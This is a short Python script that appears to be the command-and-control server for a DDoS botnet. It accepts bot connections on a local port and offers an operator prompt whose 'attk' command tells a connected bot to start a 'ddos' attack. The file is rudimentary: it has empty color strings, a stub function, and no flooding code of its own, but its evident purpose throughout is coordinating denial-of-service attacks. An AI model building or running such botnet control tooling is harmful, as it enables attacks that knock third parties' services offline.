import socket
import math 

print('server up')

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind(('127.0.0.1', 6969))
server_socket.listen(10)


no_colored =  ""
white_bold =  ""
blue_bold =   ""
green_bold =  ""
red_bold = 	  ""
yellow_bold = ""


def connection():

	global client_socket

	while True:

		(client_socket, addr) = server_socket.accept()
		print('bot connected')

		admin()




#def waiter():


def attack():

	global client_socket, addr

	client_socket.send(bytes('ddos', 'utf-8'))

	while True:

		msg = client_socket.recv(1024)

		if len(msg) > 0:
			print(msg)




def admin():

	global client_socket, addr, no_colored, white_bold, blue_bold, green_bold, red_bold, yellow_bold

	while True:

		print('')

		command = input(yellow_bold+'controll> '+no_colored)

		if command == ('attk'):

			attack()
			break

		elif command == ('help'):


			print('')
			print(green_bold+'attk -----> ddos attack')

		else:

			print(command + ' isnt a command')







connection()
